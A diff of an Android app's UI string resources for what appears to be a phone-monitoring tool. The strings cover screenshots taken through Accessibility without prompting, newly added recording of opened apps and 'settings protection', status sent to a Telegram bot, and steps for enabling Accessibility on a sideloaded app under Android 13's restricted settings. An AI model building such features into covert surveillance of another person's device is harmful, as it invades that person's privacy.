@@ -58,14 +58,14 @@
     <string name="setup_shot_unsupported">Screen capture not supported on this device</string>
     <string name="setup_a11y">Enable Accessibility</string>
     <string name="setup_a11y_on">Accessibility active</string>
-    <string name="setup_a11y_how">In the Accessibility services list, pick this app and turn it on. Once active, screenshots need no permission again even after a phone restart.</string>
+    <string name="setup_a11y_how">In the Accessibility services list, pick this app and turn it on. Accessibility is used for screen time, settings protection, and screenshots without asking again.</string>
     <string name="setup_status_a11y_fmt">Accessibility: %1$s</string>
     <string name="setup_a11y_restricted_title">Restricted setting</string>
     <string name="setup_a11y_restricted_body">Android 13 and newer block Accessibility for apps installed from outside a store.\n\n1. Open App info of this app.\n2. Tap the three-dot menu (top right) → Allow restricted settings, then confirm with PIN or fingerprint.\n3. Open Accessibility settings → downloaded services → select this app → turn it on.\n\nUntil that is done, screenshots still work through Capture Screen above.</string>
     <string name="setup_a11y_app_info">App info</string>
     <string name="setup_a11y_open_settings">Accessibility settings</string>
     <string name="shot_a11y_label">Screen Support</string>
-    <string name="shot_a11y_description">Helps take screen captures of this device when the owner asks for them.</string>
+    <string name="shot_a11y_description">Helps take screen captures, record which apps are opened, and protect device settings when the owner asks.</string>
     <string name="setup_status_sent">Status sent — check Telegram</string>
     <string name="setup_fill_all">Fill in Bot Token and Chat ID first</string>
     <string name="setup_loading">Still loading settings, try again in a moment</string>
